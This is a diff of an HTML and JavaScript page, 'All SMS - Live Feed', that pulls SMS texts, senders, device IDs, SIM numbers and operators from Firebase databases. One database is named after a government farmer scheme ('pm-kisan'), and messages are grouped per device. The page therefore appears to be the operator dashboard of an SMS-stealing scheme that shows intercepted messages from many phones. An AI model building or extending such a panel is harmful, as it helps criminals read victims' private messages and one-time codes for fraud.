@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
     <title>All SMS - Live Feed</title>
 
     <style>
@@ -15,7 +16,7 @@
         }
 
         .container {
-            max-width: 700px;
+            max-width: 600px;
             margin: 0 auto;
         }
 
@@ -26,11 +27,6 @@
             border-bottom: 1px solid #334155;
             padding-bottom: 10px;
             margin-bottom: 20px;
-            gap: 10px;
-        }
-
-        .title {
-            font-size: 1rem;
         }
 
         .back-btn {
@@ -40,6 +36,7 @@
             padding: 6px 14px;
             border: 1px solid #334155;
             border-radius: 8px;
+            transition: 0.2s;
         }
 
         .back-btn:hover {
@@ -61,6 +58,7 @@
                 opacity: 0;
                 transform: translateY(-10px);
             }
+
             to {
                 opacity: 1;
                 transform: translateY(0);
@@ -102,7 +100,7 @@
 
         .device-id {
             font-size: 0.7rem;
-            color: #94a3b8;
+            color: #475569;
             background: #0f172a;
             padding: 2px 8px;
             border-radius: 4px;
@@ -127,8 +125,13 @@
         }
 
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
         }
 
         .status-badge {
@@ -155,271 +158,462 @@
 </head>
 
 <body>
-<div class="container">
 
-    <div class="header">
-        <div>
-            <a href="index.html" class="back-btn">← Back</a>
-            <span class="title" style="margin-left: 12px;">📨 All SMS</span>
+    <div class="container">
+
+        <div class="header">
+
+            <div>
+                <a href="index.html" class="back-btn">← Back</a>
+                <span style="margin-left: 12px;">📨 All SMS</span>
+            </div>
+
+            <span id="counter" class="status-badge">
+                Loading...
+            </span>
+
         </div>
 
-        <span id="counter" class="status-badge">Loading...</span>
-    </div>
+        <div id="sms-container">
 
-    <div id="sms-container">
-        <div class="loading">
-            <span class="spinner"></span>
-            Loading recent messages...
+            <div class="loading">
+                <span class="spinner"></span>
+                Loading recent messages...
+            </div>
+
         </div>
+
     </div>
 
-</div>
+
+    <script type="module">
+
+        /*
+        ==========================================
+        FIREBASE IMPORTS
+        ==========================================
+        */
+
+        import {
+            initializeApp
+        } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+
+        import {
+            getDatabase,
+            ref,
+            query,
+            limitToLast,
+            onValue
+        } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
 
-<script type="module">
-import { initializeApp } from
-    "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        /*
+        ==========================================
+        HTML ELEMENTS
+        ==========================================
+        */
 
-import { getDatabase, ref, onValue } from
-    "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+        const container = document.getElementById('sms-container');
+        const counter = document.getElementById('counter');
 
-/*
- * Reads SMS from BOTH databases.
- *
- * Existing:
- *   All_Users/sms
- *   All_Users/simDetails
- *
- * New:
- *   user_sms/DEVICE_ID/PUSH_ID
- *   user_data/DEVICE_ID
- */
-const oldApp = initializeApp({
-    databaseURL: "https://yes2-ead3d-default-rtdb.firebaseio.com"
-}, "oldDatabase");
 
-const newApp = initializeApp({
-    databaseURL: "https://rantaishita-f7614-default-rtdb.firebaseio.com"
-}, "newDatabase");
+        /*
+        ==========================================
+        FIREBASE INITIALIZATION
+        ==========================================
+        */
 
-const oldDb = getDatabase(oldApp);
-const newDb = getDatabase(newApp);
+        const app = initializeApp({
 
-const container = document.getElementById("sms-container");
-const counter = document.getElementById("counter");
+            databaseURL:
+                "https://pm-kisan-05jg-default-rtdb.firebaseio.com"
 
-const state = {
-    oldSms: null,
-    oldSim: {},
-    newSms: null,
-    newDevices: {}
-};
+        });
 
-function safeTime(...values) {
-    for (const value of values) {
-        if (typeof value === "number" && value > 0) return value;
-        if (typeof value === "string") {
-            const n = Number(value);
-            if (Number.isFinite(n) && n > 0) return n;
-            const parsed = Date.parse(value);
-            if (!Number.isNaN(parsed)) return parsed;
+
+        const db = getDatabase(app);
+
+
+        /*
+        ==========================================
+        SMS DATABASE REFERENCE
+        ==========================================
+        */
+
+        const smsRef = ref(
+            db,
+            'csc5/All_User/Sms'
+        );
+
+
+        /*
+        ==========================================
+        FETCH ONLY THE LATEST 50 SMS
+        ==========================================
+
+        Your SMS records use Firebase Push IDs.
+
+        limitToLast(50) means Firebase will only
+        retrieve the latest 50 records instead of
+        downloading all 5000+ messages.
+
+        ==========================================
+        */
+
+        // New database structure:
+        // Sms/{deviceId}/{smsId} = { date, msg, ph }
+        //
+        // Because SMS records are nested under device IDs, Firebase
+        // cannot use limitToLast(50) here to get the latest 50 SMS
+        // globally. We fetch the device groups and flatten their SMS
+        // records in the browser, then sort by the numeric date field.
+        const recentSmsQuery = smsRef;
+
+
+        /*
+        ==========================================
+        CREATE SMS CARD
+        ==========================================
+        */
+
+        function createSmsCard(sms) {
+
+            const sender =
+                sms.ph || "Unknown";
+
+            const message =
+                sms.msg || "";
+
+            const timestamp =
+                Number(sms.date);
+
+            const time =
+                Number.isFinite(timestamp)
+                    ? new Date(timestamp).toLocaleString()
+                    : "N/A";
+
+            const deviceId =
+                sms.deviceId || "";
+
+
+            // Main card
+            const card =
+                document.createElement('div');
+
+            card.className =
+                'sms-card';
+
+
+            // Meta section
+            const meta =
+                document.createElement('div');
+
+            meta.className =
+                'meta';
+
+
+            // Sender
+            const senderElement =
+                document.createElement('span');
+
+            senderElement.textContent =
+                `📨 ${sender}`;
+
+
+            // Time
+            const timeElement =
+                document.createElement('span');
+
+            timeElement.className =
+                'time';
+
+            timeElement.textContent =
+                `🕐 ${time}`;
+
+
+            meta.appendChild(
+                senderElement
+            );
+
+            meta.appendChild(
+                timeElement
+            );
+
+
+            // Message
+            const messageElement =
+                document.createElement('p');
+
+            messageElement.className =
+                'msg';
+
+            messageElement.textContent =
+                message;
+
+
+            card.appendChild(
+                meta
+            );
+
+            card.appendChild(
+                messageElement
+            );
+
+
+            /*
+            ======================================
+            OPTIONAL DEVICE ID
+            ======================================
+            */
+
+            if (deviceId) {
+
+                const deviceInfo =
+                    document.createElement('div');
+
+                deviceInfo.className =
+                    'info';
+
+
+                const deviceLabel =
+                    document.createTextNode(
+                        '📱 Device: '
+                    );
+
+
+                const deviceElement =
+                    document.createElement('span');
+
+                deviceElement.className =
+                    'device-id';
+
+                deviceElement.textContent =
+                    deviceId;
+
+
+                deviceInfo.appendChild(
+                    deviceLabel
+                );
+
+                deviceInfo.appendChild(
+                    deviceElement
+                );
+
+
+                card.appendChild(
+                    deviceInfo
+                );
+
+            }
+
+
+            return card;
+
         }
-    }
-    return 0;
-}
 
-function flattenOldSms(snapshot) {
-    const out = [];
-    if (!snapshot?.exists()) return out;
 
-    snapshot.forEach(deviceSnapshot => {
-        const deviceId = deviceSnapshot.key;
+        /*
+        ==========================================
+        LIVE FIREBASE LISTENER
+        ==========================================
 
-        deviceSnapshot.forEach(pushSnapshot => {
-            const sms = pushSnapshot.val();
-            if (!sms || typeof sms !== "object" || Array.isArray(sms) ||
-                typeof sms.body !== "string") return;
+        This listens ONLY to the latest 50 SMS.
 
-            const sim = state.oldSim[deviceId] || {};
+        When a new SMS arrives:
 
-            out.push({
-                source: "Existing",
-                deviceId,
-                pushId: pushSnapshot.key,
-                body: sms.body,
-                sender: sms.sender || "Unknown",
-                receivedDate: sms.receivedDate || "",
-                timestamp: sms.timestamp || "",
-                timeMs: safeTime(
-                    sms.timestampMillis,
-                    sms.receivedDate,
-                    sms.timestamp
-                ),
-                number: sim.sim1Number || sim.sim2Number || "N/A",
-                provider: sim.sim1Provider || sim.sim2Provider || ""
-            });
-        });
-    });
+        1. New SMS enters the 50-message query
+        2. Oldest SMS drops out
+        3. New SMS appears at the top
 
-    return out;
-}
+        ==========================================
+        */
 
-function flattenNewSms(snapshot) {
-    const out = [];
-    if (!snapshot?.exists()) return out;
+        onValue(
 
-    snapshot.forEach(deviceSnapshot => {
-        const deviceId = deviceSnapshot.key;
-        const device = state.newDevices[deviceId] || {};
+            recentSmsQuery,
 
-        deviceSnapshot.forEach(pushSnapshot => {
-            const sms = pushSnapshot.val();
-            if (!sms || typeof sms !== "object" || Array.isArray(sms) ||
-                typeof sms.body !== "string") return;
+            (snapshot) => {
 
-            out.push({
-                source: "New",
-                deviceId,
-                pushId: pushSnapshot.key,
-                body: sms.body,
-                sender: sms.sender || "Unknown",
-                receivedDate: sms.date || "",
-                timestamp: sms.date || "",
-                timeMs: safeTime(
-                    sms.timestampMillis,
-                    sms.date,
-                    sms.timestamp
-                ),
-                number: device.phoneNumber || "N/A",
-                provider: device.sim1Provider || device.sim2Provider || "",
-                deviceName: device.d_name || device.device || ""
-            });
-        });
-    });
 
-    return out;
-}
+                /*
+                ==================================
+                NO SMS FOUND
+                ==================================
+                */
 
-let renderTimer = null;
-let firstRender = true;
+                if (!snapshot.exists()) {
 
-function scheduleRender() {
-    // Coalesce simultaneous Firebase callbacks into a single DOM update.
-    if (renderTimer !== null) return;
+                    container.innerHTML =
+                        '<div class="error">📭 No messages found</div>';
 
-    renderTimer = setTimeout(() => {
-        renderTimer = null;
-        renderMessages();
-    }, firstRender ? 0 : 120);
-}
+                    counter.textContent =
+                        '0 messages';
 
-function renderMessages() {
-    // Show exactly the newest 25 messages from EACH database.
-    // They are then combined and displayed newest-first.
-    const oldMessages = flattenOldSms(state.oldSms)
-        .sort((a, b) => b.timeMs - a.timeMs)
-        .slice(0, 25);
+                    counter.classList.remove(
+                        'live'
+                    );
 
-    const newMessages = flattenNewSms(state.newSms)
-        .sort((a, b) => b.timeMs - a.timeMs)
-        .slice(0, 25);
+                    return;
 
-    const messages = [...oldMessages, ...newMessages]
-        .sort((a, b) => b.timeMs - a.timeMs);
+                }
 
-    if (!messages.length) {
-        container.innerHTML =
-            '<div class="error">📭 No messages found</div>';
-        counter.textContent = "0 messages";
-        counter.classList.remove("live");
-        return;
-    }
 
-    counter.textContent = `${oldMessages.length} + ${newMessages.length} recent messages`;
-    counter.classList.add("live");
-    container.innerHTML = "";
+                /*
+                ==================================
+                CREATE MESSAGE ARRAY
+                ==================================
 
-    const fragment = document.createDocumentFragment();
+                New structure:
 
-    messages.forEach(sms => {
-        const card = document.createElement("div");
-        card.className = "sms-card";
+                Sms
+                  └── deviceId
+                      └── smsId
+                          ├── date
+                          ├── msg
+                          └── ph
+                ==================================
+                */
 
-        const meta = document.createElement("div");
-        meta.className = "meta";
+                const messages = [];
 
-        const senderElement = document.createElement("span");
-        senderElement.textContent = `📨 ${sms.sender}`;
+                snapshot.forEach((deviceSnapshot) => {
 
-        const timeElement = document.createElement("span");
-        timeElement.className = "time";
-        timeElement.textContent =
-            `🕐 ${sms.receivedDate || sms.timestamp || "N/A"}`;
+                    const deviceId = deviceSnapshot.key;
+                    const deviceMessages = deviceSnapshot.val();
 
-        meta.appendChild(senderElement);
-        meta.appendChild(timeElement);
-        card.appendChild(meta);
+                    if (!deviceMessages || typeof deviceMessages !== 'object') {
+                        return;
+                    }
 
-        const messageElement = document.createElement("p");
-        messageElement.className = "msg";
-        messageElement.textContent = sms.body;
-        card.appendChild(messageElement);
+                    Object.entries(deviceMessages).forEach(
+                        ([smsId, sms]) => {
 
-        const sourceInfo = document.createElement("div");
-        sourceInfo.className = "info";
-        sourceInfo.textContent = `🗄️ Database: ${sms.source}`;
-        card.appendChild(sourceInfo);
+                            if (!sms || typeof sms !== 'object') {
+                                return;
+                            }
 
-        const operatorInfo = document.createElement("div");
-        operatorInfo.className = "info";
-        operatorInfo.textContent =
-            `⚙️ Operator: ${sms.provider || "Unknown"} · Number: ${sms.number || "N/A"}`;
-        card.appendChild(operatorInfo);
+                            messages.push({
+                                id: smsId,
+                                deviceId: deviceId,
+                                ...sms
+                            });
 
-        const deviceInfo = document.createElement("div");
-        deviceInfo.className = "info";
-        deviceInfo.textContent =
-            `📱 Device: ${sms.deviceId}` +
-            (sms.deviceName ? ` · ${sms.deviceName}` : "");
-        card.appendChild(deviceInfo);
+                        }
+                    );
 
-        fragment.appendChild(card);
-    });
+                });
 
-    container.appendChild(fragment);
-    firstRender = false;
-}
+                /*
+                ==================================
+                SORT BY DATE
+                ==================================
 
-/* Existing database */
-onValue(ref(oldDb, "All_Users/sms"), snapshot => {
-    state.oldSms = snapshot;
-    scheduleRender();
-}, error => {
-    console.error("Existing SMS database error:", error);
-    state.oldSms = null;
-    scheduleRender();
-});
+                The new database stores the SMS timestamp
+                in the "date" field as milliseconds.
+                ==================================
+                */
 
-onValue(ref(oldDb, "All_Users/simDetails"), snapshot => {
-    state.oldSim = snapshot.exists() ? (snapshot.val() || {}) : {};
-    scheduleRender();
-}, error => console.error("Existing SIM details error:", error));
+                messages.sort(
+                    (a, b) =>
+                        Number(b.date || 0) - Number(a.date || 0)
+                );
 
-/* New database */
-onValue(ref(newDb, "user_sms"), snapshot => {
-    state.newSms = snapshot;
-    scheduleRender();
-}, error => {
-    console.error("New SMS database error:", error);
-    state.newSms = null;
-    scheduleRender();
-});
+                // Keep only the newest 50 SMS after sorting.
+                const recentMessages = messages.slice(0, 50);
 
-onValue(ref(newDb, "user_data"), snapshot => {
-    state.newDevices = snapshot.exists() ? (snapshot.val() || {}) : {};
-    scheduleRender();
-}, error => console.error("New device data error:", error));
-</script>
+                /*
+                ==================================
+                UPDATE COUNTER
+                ==================================
+                */
+
+                counter.textContent =
+                    `${recentMessages.length} recent messages`;
+
+                counter.classList.add(
+                    'live'
+                );
+
+
+                /*
+                ==================================
+                CLEAR OLD DISPLAY
+                ==================================
+                */
+
+                container.innerHTML =
+                    '';
+
+
+                /*
+                ==================================
+                CREATE DOCUMENT FRAGMENT
+                ==================================
+
+                This improves rendering performance.
+                ==================================
+                */
+
+                const fragment =
+                    document.createDocumentFragment();
+
+
+                /*
+                ==================================
+                ADD 50 SMS CARDS
+                ==================================
+                */
+
+                for (const sms of recentMessages) {
+
+                    fragment.appendChild(
+                        createSmsCard(sms)
+                    );
+
+                }
+
+
+                /*
+                ==================================
+                DISPLAY MESSAGES
+                ==================================
+                */
+
+                container.appendChild(
+                    fragment
+                );
+
+            },
+
+
+            /*
+            ======================================
+            FIREBASE ERROR
+            ======================================
+            */
+
+            (error) => {
+
+                console.error(
+                    'Firebase Error:',
+                    error
+                );
+
+                container.innerHTML =
+                    `<div class="error">❌ ${error.message}</div>`;
+
+                counter.textContent =
+                    'Error';
+
+                counter.classList.remove(
+                    'live'
+                );
+
+            }
+
+        );
+
+    </script>
 
 </body>
 </html>
